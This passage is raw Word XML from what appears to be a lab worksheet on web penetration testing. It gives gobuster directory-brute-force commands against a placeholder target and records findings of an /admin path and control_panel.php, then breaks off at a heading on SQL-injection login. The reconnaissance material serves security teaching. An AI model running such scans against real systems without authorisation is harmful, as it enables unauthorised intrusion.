          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>o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ries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 xml:space="preserve"> w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ith Go</w:t>
      </w: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b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u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ter</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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In 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K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li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ermi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l,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 (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 line):</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="216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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">gobuster dir -u http://&lt;target_IP&gt;/ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="19"/>
        <w:ind w:left="216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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/usr/share/wordlists/dirbuster/directory</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>lis</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>2.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>3-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">medium.txt </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t 30</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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We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e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ny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ector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un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?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y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s, list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em:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="10"/>
          <w:szCs w:val="10"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="007E35E5">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="11040"/>
        </w:tabs>
        <w:ind w:left="2564"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="700" w:right="0" w:bottom="280" w:left="0" w:header="0" w:footer="765" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:pict>
          <v:shape id="_x0000_s1116" type="#_x0000_t75" style="position:absolute;left:0;text-align:left;margin-left:-4.5pt;margin-top:724pt;width:619.05pt;height:20.3pt;z-index:-1895;mso-position-horizontal-relative:page;mso-position-vertical-relative:page">
            <v:imagedata r:id="rId22" o:title=""/>
            <w10:wrap anchorx="page" anchory="page"/>
          </v:shape>
        </w:pict>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-4"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ectorie</w:t>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007259DA">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t>yes. admin</w:t>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="37"/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c.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="37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y 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sing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e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sc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v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ed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ectory, e.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g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.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:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="10" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>http://&lt;target_IP&gt;/admin</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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Wh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 y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u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er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v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e?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="18" w:line="280" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="10700"/>
        </w:tabs>
        <w:ind w:left="252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80808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80808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808080"/>
          <w:spacing w:val="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808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ul</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="80808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808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007259DA">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t>forbidden.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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e.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="25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un Go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er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gai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,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his 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ime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g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he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/a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mi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/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(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ne li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e):</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="216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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">gobuster dir -u http://&lt;target_IP&gt;/admin/ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="19"/>
        <w:ind w:left="2122" w:right="1327"/>
        <w:jc w:val="center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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/usr/share/wordlists/dirbuster/directory</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>lis</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>2.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>3-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">medium.txt </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t 30</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="18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Wh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io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l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ul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(if</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-4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ny)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id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y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ou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in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?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="18" w:line="280" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="10660"/>
        </w:tabs>
        <w:ind w:left="252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808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Fi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>nd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-3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808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">ngs: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007259DA">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t>yes, control_panel.php</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="2" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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g.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="3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y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v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isiting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nt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ol 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el (if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):</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>http://&lt;target_IP&gt;/admin/control_panel.php</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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Was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 pa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g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e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cc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ssi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?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="18" w:line="280" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="10700"/>
        </w:tabs>
        <w:spacing w:line="240" w:lineRule="exact"/>
        <w:ind w:left="252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808080"/>
          <w:spacing w:val="-1"/>
          <w:position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808080"/>
          <w:position w:val="-1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808080"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-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808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ul</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-1"/>
          <w:position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808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007259DA">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t>forbidden</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="12" w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="34"/>
        <w:ind w:left="1440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4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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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 xml:space="preserve">Log in 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>w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ith SQL Injec</w:t>
      </w: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t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ion</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
